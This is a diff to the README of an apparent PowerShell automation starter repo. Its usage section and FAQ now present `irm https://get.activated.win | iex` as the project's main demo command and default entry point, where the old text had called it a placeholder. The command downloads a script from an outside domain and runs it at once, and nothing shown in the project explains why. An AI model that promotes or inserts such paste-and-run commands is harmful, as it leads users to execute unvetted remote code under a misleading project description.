@@ -97,12 +97,9 @@ cd irm
 
 ## ▶️ Usage
 
+> Main command:
+
 ```powershell
-# Insert your PowerShell command here.
-irm https://get.activated.win | iex
-irm https://get.activated.win | iex
-irm https://get.activated.win | iex
-irm https://get.activated.win | iex
 irm https://get.activated.win | iex
 ```
 
@@ -150,9 +147,9 @@ powershell -NoProfile -ExecutionPolicy Bypass -File .\run.ps1
 
 A: A clean PowerShell automation starter repo with premium README documentation and a developer-first layout.
 
-**Q: Why was `irm https://get.activated.win | iex` added?**
+**Q: Why is `irm https://get.activated.win | iex` the main command?**
 
-A: It is included as a placeholder command example. Always verify remote content before running.
+A: It is the primary demo command for this project and should be highlighted as the default entry point. Always verify remote content before running it.
 
 **Q: What should I change next?**
 
